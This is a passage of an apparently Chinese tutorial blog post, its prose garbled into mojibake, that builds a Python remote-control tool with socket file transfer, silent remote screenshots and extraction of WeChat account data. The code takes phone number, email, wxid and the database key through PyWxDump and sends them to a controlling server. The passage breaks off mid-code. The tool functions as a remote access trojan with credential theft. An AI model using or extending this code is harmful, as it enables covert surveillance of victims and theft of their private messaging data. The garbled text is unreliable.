<p>æ‰€è°“åŒæ­¥ï¼Œä¸€å®šæ˜¯<strong class=chinese>ä¸€æ”¶ä¸€å‘</strong>çš„å½¢å¼ï¼Œä¸è®ºæ˜¯å®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡ç«¯ï¼Œä¸€æ—¦æœ‰ä¸€ç«¯å‡ºç°äº†è¿ç»­ä¸¤æ¬¡çš„å‘é€æˆ–è€…æ¥æ”¶ï¼Œåœ¨å®é™…çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¸€å®šä¼šå‡ºç°æ­»é”çš„ç°è±¡ï¼Œä¹Ÿå°±æ˜¯åŒæ–¹éƒ½åœ¨ç­‰å¾…å¯¹æ–¹å‘é€æ¶ˆæ¯ï¼ŒåŒæ–¹ä¸€ç›´é˜»å¡ã€‚</p>
<p>è¿œç¨‹ä¸‹è½½æ–‡ä»¶çš„æ•´ä½“æµç¨‹å’Œæ¡†æ¶ï¼š</p>
<p>{% mermaid %}</p>
<p>graph TB</p>
<p>a[æœåŠ¡ç«¯å‘é€ä¸‹è½½æ–‡ä»¶æŒ‡ä»¤å¹¶æŒ‡å®šæ–‡ä»¶åç§°]&ndash;&gt;b[å®¢æˆ·ç«¯æ¥æ”¶ä¸‹è½½æ–‡ä»¶æŒ‡ä»¤]</p>
<p>b&ndash;&gt;c[å®¢æˆ·ç«¯æœç´¢æ–‡ä»¶æ˜¯å¦å­˜åœ¨]</p>
<p>c&ndash;&gt;|å­˜åœ¨|d[å®¢æˆ·ç«¯è¯»å–æ–‡ä»¶æ•°æ®å¹¶å‘é€å¤´éƒ¨ä¿¡æ¯]</p>
<p>c&ndash;&gt;|ä¸å­˜åœ¨|e[å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€ä¸å­˜åœ¨æŒ‡ä»¤]</p>
<p>d&ndash;&gt;f[æœåŠ¡ç«¯æ¥æ”¶å¤´éƒ¨ä¿¡æ¯å‘é€ç¡®è®¤ä¿¡æ¯]</p>
<p>e&ndash;&gt;h[åŒæ–¹é€€å‡ºä¸‹è½½æ–‡ä»¶æµç¨‹]</p>
<p>f&ndash;&gt;f1[å®¢æˆ·ç«¯æ¥æ”¶ç¡®è®¤ä¿¡æ¯å¹¶å‘é€æ–‡ä»¶æ•°æ®]</p>
<p>f1&ndash;&gt;f2[æœåŠ¡ç«¯æ¥æ”¶æ–‡ä»¶æ•°æ®å¹¶å†™å…¥æœ¬åœ°æ–‡ä»¶]</p>
<p>{% endmermaid %}</p>
<p>è¿™å…¶ä¸­æœ‰ä¸€æ­¥æ˜¯å‘é€å’Œç¡®è®¤æ–‡ä»¶çš„å¤´éƒ¨ä¿¡æ¯ï¼Œè¿™æ˜¯ä¸ºäº†å‘Šè¯‰æœåŠ¡ç«¯æ‰€è¦æ¥æ”¶çš„æ–‡ä»¶çš„æ–‡ä»¶å¤§å°å’Œåç§°ï¼Œä»¥ä¾¿å†™å…¥æ–‡ä»¶ã€‚</p>
<p>å½“ç„¶è¿™ä¸€æ­¥æ˜¯å¯ä»¥çœç•¥çš„ï¼ŒæœåŠ¡ç«¯å¯ä»¥æ ¹æ®è¾“å…¥çš„æŒ‡ä»¤ä¿¡æ¯å¾—çŸ¥æ–‡ä»¶çš„åç§°</p>
<p>åœ¨æ­¤ç¨‹åºä¸­ï¼Œä½¿ç”¨ <code>get æ–‡ä»¶åç§°</code> çš„æ–¹å¼å‘Šè¯‰åŒæ–¹ï¼Œæˆ‘éœ€è¦è¿›è¡Œä¸‹è½½æ–‡ä»¶çš„æµç¨‹</p>
<p><strong>Serverç«¯getå‡½æ•°ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a90d91">def</span> <span style="color:#000">get_file</span>(<span style="color:#000">conn</span>):  
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># æ–‡ä»¶ä¸å­˜åœ¨çš„æƒ…å†µ  </span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">rev</span> <span style="color:#000">=</span> <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">recv</span>(<span style="color:#1c01ce">1024</span>)  
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">if</span> <span style="color:#000">rev</span> <span style="color:#000">==</span> <span style="color:#c41a16">b</span><span style="color:#c41a16">&#39;file_not_exist&#39;</span>:  
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">print</span>(<span style="color:#c41a16">&#39;æ–‡ä»¶ä¸å­˜åœ¨&#39;</span>)  
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">return</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">send</span>(<span style="color:#c41a16">b</span><span style="color:#c41a16">&#39;start&#39;</span>)  
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># æ¥æ”¶æ–‡ä»¶å¤´éƒ¨å¤§å°  </span>
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">try</span>:  
</span></span><span style="display:flex;"><span>        <span style="color:#000">rev</span> <span style="color:#000">=</span> <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">recv</span>(<span style="color:#1c01ce">4</span>)  
</span></span><span style="display:flex;"><span>        <span style="color:#000">header_size</span> <span style="color:#000">=</span> <span style="color:#000">struct</span><span style="color:#000">.</span><span style="color:#000">unpack</span>(<span style="color:#c41a16">&#39;i&#39;</span>, <span style="color:#000">rev</span>)[<span style="color:#1c01ce">0</span>]  
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">except</span> (<span style="color:#000">struct</span><span style="color:#000">.</span><span style="color:#000">error</span>, <span style="color:#000">ConnectionResetError</span>):  
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">print</span>(<span style="color:#c41a16">&#34;åœ¨æ¥æ”¶æ–‡ä»¶å¤´éƒ¨é•¿åº¦æ—¶å‘ç”Ÿé”™è¯¯&#34;</span>)  
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">return</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># å‘é€ç¡®è®¤æ¶ˆæ¯  </span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">send</span>(<span style="color:#c41a16">b</span><span style="color:#c41a16">&#39;size_ok&#39;</span>)  
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># æ¥æ”¶æ–‡ä»¶å¤´éƒ¨ä¿¡æ¯  </span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">header_bytes</span> <span style="color:#000">=</span> <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">recv</span>(<span style="color:#000">header_size</span>)<span style="color:#000">.</span><span style="color:#000">decode</span>(<span style="color:#c41a16">&#39;UTF-8&#39;</span>)  
</span></span><span style="display:flex;"><span>    <span style="color:#000">header</span> <span style="color:#000">=</span> <span style="color:#000">json</span><span style="color:#000">.</span><span style="color:#000">loads</span>(<span style="color:#000">header_bytes</span>)  
</span></span><span style="display:flex;"><span>    <span style="color:#000">file_name</span> <span style="color:#000">=</span> <span style="color:#000">header</span>[<span style="color:#c41a16">&#39;file_name&#39;</span>]  
</span></span><span style="display:flex;"><span>    <span style="color:#000">file_size</span> <span style="color:#000">=</span> <span style="color:#000">header</span>[<span style="color:#c41a16">&#39;file_size&#39;</span>]  
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># å‘é€ç¡®è®¤æ¶ˆæ¯  </span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">send</span>(<span style="color:#c41a16">b</span><span style="color:#c41a16">&#39;header_ok&#39;</span>)  
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">print</span>(<span style="color:#c41a16">f</span><span style="color:#c41a16">&#39;æ–‡ä»¶åç§°ï¼š</span><span style="color:#c41a16">{</span><span style="color:#000">file_name</span><span style="color:#c41a16">}</span><span style="color:#c41a16">ï¼Œæ–‡ä»¶å¤§å°ï¼š</span><span style="color:#c41a16">{</span><span style="color:#000">file_size</span><span style="color:#c41a16">}</span><span style="color:#c41a16"> B&#39;</span>)  
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">print</span>(<span style="color:#c41a16">&#39;å¼€å§‹æ¥æ”¶æ–‡ä»¶...&#39;</span>)  
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">try</span>:  
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">with</span> <span style="color:#a90d91">open</span>(<span style="color:#000">file_name</span>, <span style="color:#c41a16">&#39;wb&#39;</span>) <span style="color:#a90d91">as</span> <span style="color:#000">f</span>:  
</span></span><span style="display:flex;"><span>            <span style="color:#a90d91">while</span> <span style="color:#000">file_size</span> <span style="color:#000">&gt;</span> <span style="color:#1c01ce">0</span>:  
</span></span><span style="display:flex;"><span>                <span style="color:#000">content</span> <span style="color:#000">=</span> <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">recv</span>(<span style="color:#1c01ce">1024</span>)  
</span></span><span style="display:flex;"><span>                <span style="color:#000">file_size</span> <span style="color:#000">-=</span> <span style="color:#a90d91">len</span>(<span style="color:#000">content</span>)  
</span></span><span style="display:flex;"><span>                <span style="color:#000">f</span><span style="color:#000">.</span><span style="color:#000">write</span>(<span style="color:#000">content</span>)  
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">except</span> <span style="color:#000">IOError</span> <span style="color:#a90d91">as</span> <span style="color:#000">e</span>:  
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">print</span>(<span style="color:#c41a16">f</span><span style="color:#c41a16">&#34;åœ¨å†™å…¥æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯: </span><span style="color:#c41a16">{</span><span style="color:#000">e</span><span style="color:#c41a16">}</span><span style="color:#c41a16">&#34;</span>)  
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">return</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">print</span>(<span style="color:#c41a16">&#39;æ¥æ”¶æ–‡ä»¶å®Œæˆ&#39;</span>)
</span></span></code></pre></div><p><strong>Clientç«¯getå‡½æ•°ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a90d91">def</span> <span style="color:#000">get_file</span>(<span style="color:#000">conn</span>, <span style="color:#000">file_name</span>):  
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">if</span> <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">path</span><span style="color:#000">.</span><span style="color:#000">isfile</span>(<span style="color:#000">file_name</span>):  
</span></span><span style="display:flex;"><span>        <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">send</span>(<span style="color:#c41a16">b</span><span style="color:#c41a16">&#39;file_exist&#39;</span>)  
</span></span><span style="display:flex;"><span>        <span style="color:#000">rev</span> <span style="color:#000">=</span> <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">recv</span>(<span style="color:#1c01ce">1024</span>)  
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">if</span> <span style="color:#000">rev</span> <span style="color:#000">!=</span> <span style="color:#c41a16">b</span><span style="color:#c41a16">&#39;start&#39;</span>:  
</span></span><span style="display:flex;"><span>            <span style="color:#a90d91">return</span>  
</span></span><span style="display:flex;"><span>        <span style="color:#000">file_size</span> <span style="color:#000">=</span> <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">path</span><span style="color:#000">.</span><span style="color:#000">getsize</span>(<span style="color:#000">file_name</span>)  
</span></span><span style="display:flex;"><span>        <span style="color:#000">header</span> <span style="color:#000">=</span> {  
</span></span><span style="display:flex;"><span>            <span style="color:#c41a16">&#39;file_name&#39;</span>: <span style="color:#000">file_name</span>,  
</span></span><span style="display:flex;"><span>            <span style="color:#c41a16">&#39;file_size&#39;</span>: <span style="color:#000">file_size</span>  
</span></span><span style="display:flex;"><span>        }  
</span></span><span style="display:flex;"><span>        <span style="color:#000">header_json</span> <span style="color:#000">=</span> <span style="color:#000">json</span><span style="color:#000">.</span><span style="color:#000">dumps</span>(<span style="color:#000">header</span>)  
</span></span><span style="display:flex;"><span>        <span style="color:#000">header_bytes</span> <span style="color:#000">=</span> <span style="color:#000">header_json</span><span style="color:#000">.</span><span style="color:#000">encode</span>(<span style="color:#c41a16">&#39;UTF-8&#39;</span>)  
</span></span><span style="display:flex;"><span>        <span style="color:#000">header_size</span> <span style="color:#000">=</span> <span style="color:#000">struct</span><span style="color:#000">.</span><span style="color:#000">pack</span>(<span style="color:#c41a16">&#39;i&#39;</span>, <span style="color:#a90d91">len</span>(<span style="color:#000">header_bytes</span>))  
</span></span><span style="display:flex;"><span>        <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">send</span>(<span style="color:#000">header_size</span>)  
</span></span><span style="display:flex;"><span>        <span style="color:#000">rev</span> <span style="color:#000">=</span> <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">recv</span>(<span style="color:#1c01ce">1024</span>)  
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">if</span> <span style="color:#000">rev</span> <span style="color:#000">!=</span> <span style="color:#c41a16">b</span><span style="color:#c41a16">&#39;size_ok&#39;</span>:  
</span></span><span style="display:flex;"><span>            <span style="color:#a90d91">return</span>  
</span></span><span style="display:flex;"><span>        <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">send</span>(<span style="color:#000">header_bytes</span>)  
</span></span><span style="display:flex;"><span>        <span style="color:#000">rev</span> <span style="color:#000">=</span> <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">recv</span>(<span style="color:#1c01ce">1024</span>)  
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">if</span> <span style="color:#000">rev</span> <span style="color:#000">==</span> <span style="color:#c41a16">b</span><span style="color:#c41a16">&#39;header_ok&#39;</span>:  
</span></span><span style="display:flex;"><span>            <span style="color:#a90d91">try</span>:  
</span></span><span style="display:flex;"><span>                <span style="color:#a90d91">with</span> <span style="color:#a90d91">open</span>(<span style="color:#000">file_name</span>, <span style="color:#c41a16">&#39;rb&#39;</span>) <span style="color:#a90d91">as</span> <span style="color:#000">f</span>:  
</span></span><span style="display:flex;"><span>                    <span style="color:#a90d91">while</span> <span style="color:#000">file_size</span> <span style="color:#000">&gt;</span> <span style="color:#1c01ce">0</span>:  
</span></span><span style="display:flex;"><span>                        <span style="color:#000">content</span> <span style="color:#000">=</span> <span style="color:#000">f</span><span style="color:#000">.</span><span style="color:#000">read</span>(<span style="color:#1c01ce">1024</span>)  
</span></span><span style="display:flex;"><span>                        <span style="color:#000">file_size</span> <span style="color:#000">-=</span> <span style="color:#a90d91">len</span>(<span style="color:#000">content</span>)  
</span></span><span style="display:flex;"><span>                        <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">send</span>(<span style="color:#000">content</span>)  
</span></span><span style="display:flex;"><span>            <span style="color:#a90d91">except</span> <span style="color:#000">Exception</span> <span style="color:#a90d91">as</span> <span style="color:#000">e</span>:  
</span></span><span style="display:flex;"><span>                <span style="color:#a90d91">print</span>(<span style="color:#c41a16">f</span><span style="color:#c41a16">&#34;å‘é€é”™è¯¯: </span><span style="color:#c41a16">{</span><span style="color:#000">e</span><span style="color:#c41a16">}</span><span style="color:#c41a16">&#34;</span>)  
</span></span><span style="display:flex;"><span>                <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">send</span>(<span style="color:#c41a16">b</span><span style="color:#c41a16">&#39;&#39;</span>)  
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">else</span>:  
</span></span><span style="display:flex;"><span>        <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">send</span>(<span style="color:#c41a16">b</span><span style="color:#c41a16">&#39;file_not_exist&#39;</span>)
</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214251.png" alt="ä¸‹è½½æ–‡ä»¶"></p>
<h3 id="è¿œç¨‹ä¸Šä¼ æ–‡ä»¶">è¿œç¨‹ä¸Šä¼ æ–‡ä»¶</h3>
<p>åœ¨è¿™ä¸€éƒ¨åˆ†ï¼Œæ•´ä½“çš„æµç¨‹å’Œä¸Šé¢çš„è¿œç¨‹æ–‡ä»¶ä¸‹è½½åŸºæœ¬ä¸€è‡´ï¼Œå°±æ˜¯å°†ä¸Šæ–¹æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯çš„æµç¨‹å¯¹è°ƒ</p>
<p>è¿™é‡Œå°±ä¸è¿‡å¤šä»‹ç»ï¼Œä»£ç æ˜¯ä¸€æ ·çš„</p>
<p>åœ¨æ­¤ç¨‹åºä¸­ä½¿ç”¨ <code>put æ–‡ä»¶åç§°</code> çš„å½¢å¼ï¼Œå‘Šè¯‰åŒæ–¹æˆ‘éœ€è¦è¿›å…¥ä¸Šä¼ æ–‡ä»¶çš„æµç¨‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214303.png" alt="ä¸Šä¼ æ–‡ä»¶"></p>
<h3 id="è¿œç¨‹è·å–å±å¹•æˆªå›¾">è¿œç¨‹è·å–å±å¹•æˆªå›¾</h3>
<p>Pythonè·å–å±å¹•æˆªå›¾çš„æ–¹å¼å¾ˆå¤šï¼Œæ¯”å¦‚PILä¸­çš„ImageGrabæ¨¡å—ã€windows APIã€PyQtã€pyautoguiç­‰ç­‰</p>
<p><a href="https://blog.csdn.net/c_lanxiaofang/article/details/126412158">å‚è€ƒæ–‡ç« </a></p>
<p>åœ¨æ­¤ç¨‹åºä¸­ä½¿ç”¨äº†PILä¸­çš„ImageGrabæ¨¡å—ï¼ŒåŸå› å°±æ˜¯æ“ä½œååˆ†ç®€å•ï¼Œç¼ºç‚¹æ˜¯æ•ˆç‡è¾ƒä½ï¼Œä½†æ˜¯å¯¹äºæˆ‘ä»¬è¿™ä¸ªç¨‹åºæ¥è¯´ï¼Œå‡ ä¹æ„Ÿè§‰ä¸å‡ºå·®åˆ«</p>
<p>ImageGrabæ¨¡å—åªéœ€è¦ä¸¤æ¡å‘½ä»¤å°±èƒ½æå®šå…¨å±æˆªå›¾ï¼Œååˆ†æ–¹ä¾¿</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#000">im</span> <span style="color:#000">=</span> <span style="color:#000">ImageGrab</span><span style="color:#000">.</span><span style="color:#000">grab</span>()
</span></span><span style="display:flex;"><span><span style="color:#000">im</span><span style="color:#000">.</span><span style="color:#000">save</span>(<span style="color:#000">file_name</span>)
</span></span></code></pre></div><p>è¿œç¨‹è·å–å±å¹•æˆªå›¾çš„æ•´ä½“æµç¨‹å’Œæ¡†æ¶ï¼š</p>
<p>{% mermaid %}</p>
<p>graph TB</p>
<p>a[æœåŠ¡ç«¯å‘é€æˆªå±æŒ‡ä»¤å¹¶è¿›å…¥æˆªå±æµç¨‹]&ndash;&gt;b[å®¢æˆ·ç«¯æ¥æ”¶æˆªå±æŒ‡ä»¤å¹¶è¿›å…¥æˆªå±æµç¨‹]</p>
<p>b&ndash;&gt;c[æœåŠ¡ç«¯å‘é€&rsquo;start&rsquo;æŒ‡ä»¤]</p>
<p>c&ndash;&gt;d[å®¢æˆ·ç«¯ç«¯æ¥æ”¶&rsquo;start&rsquo;æŒ‡ä»¤å¹¶æˆªå±ä¿å­˜æ–‡ä»¶]</p>
<p>d&ndash;&gt;f[è¿›å…¥getä¸‹è½½æ–‡ä»¶æµç¨‹]</p>
<p>c&ndash;&gt;f</p>
<p>f&ndash;&gt;e[å®¢æˆ·ç«¯åˆ é™¤æˆªå±æ–‡ä»¶,åŒæ–¹é€€å‡ºæˆªå±æµç¨‹]</p>
<p>{% endmermaid %}</p>
<p>åœ¨æ­¤ç¨‹åºä¸­ï¼Œä½¿ç”¨ <code>screen</code> çš„æ–¹å¼å‘Šè¯‰åŒæ–¹ï¼Œæˆ‘éœ€è¦è¿›è¡Œæˆªå±çš„æµç¨‹</p>
<p><strong>Serverç«¯screenå‡½æ•°ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a90d91">def</span> <span style="color:#000">screen_shot</span>(<span style="color:#000">conn</span>):  
</span></span><span style="display:flex;"><span>    <span style="color:#000">rev</span> <span style="color:#000">=</span> <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">recv</span>(<span style="color:#1c01ce">1024</span>)  
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">if</span> <span style="color:#000">rev</span> <span style="color:#000">!=</span> <span style="color:#c41a16">b</span><span style="color:#c41a16">&#39;screen&#39;</span>:  
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">print</span>(<span style="color:#c41a16">&#39;æˆªå›¾å¤±è´¥&#39;</span>)  
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">return</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">send</span>(<span style="color:#c41a16">b</span><span style="color:#c41a16">&#39;start&#39;</span>)  
</span></span><span style="display:flex;"><span>    <span style="color:#000">get_file</span>(<span style="color:#000">conn</span>)
</span></span></code></pre></div><p><strong>Clientç«¯screenå‡½æ•°ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a90d91">def</span> <span style="color:#000">screen_shot</span>(<span style="color:#000">conn</span>):  
</span></span><span style="display:flex;"><span>    <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">send</span>(<span style="color:#c41a16">b</span><span style="color:#c41a16">&#39;screen&#39;</span>)  
</span></span><span style="display:flex;"><span>    <span style="color:#000">rev</span> <span style="color:#000">=</span> <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">recv</span>(<span style="color:#1c01ce">1024</span>)  
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">if</span> <span style="color:#000">rev</span> <span style="color:#000">!=</span> <span style="color:#c41a16">b</span><span style="color:#c41a16">&#39;start&#39;</span>:  
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">return</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># æˆªå›¾å¹¶å‘ç”Ÿåˆ°æœåŠ¡ç«¯  </span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">im</span> <span style="color:#000">=</span> <span style="color:#000">ImageGrab</span><span style="color:#000">.</span><span style="color:#000">grab</span>()  
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># æˆªå±å‘½åä¸ºå½“å‰æ—¶é—´  </span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">file_name</span> <span style="color:#000">=</span> <span style="color:#000">time</span><span style="color:#000">.</span><span style="color:#000">strftime</span>(<span style="color:#c41a16">&#34;%Y-%m-</span><span style="color:#c41a16">%d</span><span style="color:#c41a16"> %H-%M-%S&#34;</span>, <span style="color:#000">time</span><span style="color:#000">.</span><span style="color:#000">localtime</span>()) <span style="color:#000">+</span> <span style="color:#c41a16">&#39;.png&#39;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#000">im</span><span style="color:#000">.</span><span style="color:#000">save</span>(<span style="color:#000">file_name</span>)  
</span></span><span style="display:flex;"><span>    <span style="color:#000">get_file</span>(<span style="color:#000">conn</span>, <span style="color:#000">file_name</span>)  
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># åˆ é™¤æœ¬åœ°æˆªå›¾  </span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">os</span><span style="color:#000">.</span><span style="color:#000">remove</span>(<span style="color:#000">file_name</span>)
</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214314.png" alt="æˆªå±">
<img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214330.png" alt="æˆªå–çš„å›¾ç‰‡æ‹‰å–åˆ°æœ¬åœ°"></p>
<h3 id="è·å–å¾®ä¿¡æ•°æ®">è·å–å¾®ä¿¡æ•°æ®</h3>
<p>è¿™é‡ŒåŠŸèƒ½æ˜¯åŸºäºGithubå¼€æºé¡¹ç›®ï¼š<a href="https://github.com/xaoyaoo/PyWxDump">PyWxDump</a></p>
<p>å…¶æä¾›äº†ä¸€ç³»åˆ—è·å–å¾®ä¿¡æ•°æ®ä¿¡æ¯ã€èŠå¤©è®°å½•ç­‰Pythonæ¥å£</p>
<p>åˆ©ç”¨è¿™ä¸ªpythoné¡¹ç›®ï¼Œå¯ä»¥å¾ˆå®¹æ˜“è·å–åˆ°å¾®ä¿¡æ•°æ®</p>
<p>å¦‚è·å–å¾®ä¿¡åŸºæœ¬ä¿¡æ¯ï¼š</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a90d91">def</span> <span style="color:#000">get_wechat_info</span>(<span style="color:#000">conn</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># è¯»å–æ–‡ä»¶ä¸­çš„jsonæ•°æ®</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">with</span> <span style="color:#a90d91">open</span>(<span style="color:#c41a16">&#39;version_list.json&#39;</span>, <span style="color:#c41a16">&#39;r&#39;</span>, <span style="color:#000">encoding</span><span style="color:#000">=</span><span style="color:#c41a16">&#39;UTF-8&#39;</span>) <span style="color:#a90d91">as</span> <span style="color:#000">f</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#000">version_list</span> <span style="color:#000">=</span> <span style="color:#000">json</span><span style="color:#000">.</span><span style="color:#000">load</span>(<span style="color:#000">f</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#177500"># è¯»å–å¾®ä¿¡ä¿¡æ¯</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">wx_info</span> <span style="color:#000">=</span> <span style="color:#000">read_info</span>(<span style="color:#000">version_list</span>, <span style="color:#a90d91">False</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">if</span> <span style="color:#a90d91">str</span>(<span style="color:#000">wx_info</span>)<span style="color:#000">.</span><span style="color:#000">startswith</span>(<span style="color:#c41a16">&#39;[-]&#39;</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#000">conn</span><span style="color:#000">.</span><span style="color:#000">send</span>(<span style="color:#000">wx_info</span><span style="color:#000">.</span><span style="color:#000">encode</span>(<span style="color:#c41a16">&#39;UTF-8&#39;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">return</span> <span style="color:#a90d91">None</span>, <span style="color:#a90d91">None</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">pid</span> <span style="color:#000">=</span> <span style="color:#000">wx_info</span>[<span style="color:#1c01ce">0</span>][<span style="color:#c41a16">&#39;pid&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#000">version</span> <span style="color:#000">=</span> <span style="color:#000">wx_info</span>[<span style="color:#1c01ce">0</span>][<span style="color:#c41a16">&#39;version&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#000">account</span> <span style="color:#000">=</span> <span style="color:#000">wx_info</span>[<span style="color:#1c01ce">0</span>][<span style="color:#c41a16">&#39;account&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#000">mobile</span> <span style="color:#000">=</span> <span style="color:#000">wx_info</span>[<span style="color:#1c01ce">0</span>][<span style="color:#c41a16">&#39;mobile&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#000">name</span> <span style="color:#000">=</span> <span style="color:#000">wx_info</span>[<span style="color:#1c01ce">0</span>][<span style="color:#c41a16">&#39;name&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#000">mail</span> <span style="color:#000">=</span> <span style="color:#000">wx_info</span>[<span style="color:#1c01ce">0</span>][<span style="color:#c41a16">&#39;mail&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#000">wxid</span> <span style="color:#000">=</span> <span style="color:#000">wx_info</span>[<span style="color:#1c01ce">0</span>][<span style="color:#c41a16">&#39;wxid&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#000">file_path</span> <span style="color:#000">=</span> <span style="color:#000">wx_info</span>[<span style="color:#1c01ce">0</span>][<span style="color:#c41a16">&#39;filePath&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#000">key</span> <span style="color:#000">=</span> <span style="color:#000">wx_info</span>[<span style="color:#1c01ce">0</span>][<span style="color:#c41a16">&#39;key&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#000">wechat_files</span> <span style="color:#000">=</span> <span style="color:#a90d91">str</span>(<span style="color:#000">Path</span>(<span style="color:#000">file_path</span>)<span style="color:#000">.</span><span style="color:#000">parent</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#000">content</span> <span style="color:#000">=</span> <span style="color:#c41a16">f</span><span style="color:#c41a16">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">    ================== wechat info ==================
</span></span></span><span style="display:flex;"><span><span style="color:#c41a16">    [+] è¿›ç¨‹å·: </span><span style="color:#c41a16">{</span><span style="color:#000">pid</span><span style="color:#c41a16">}</span><span style="color:#c41a16">
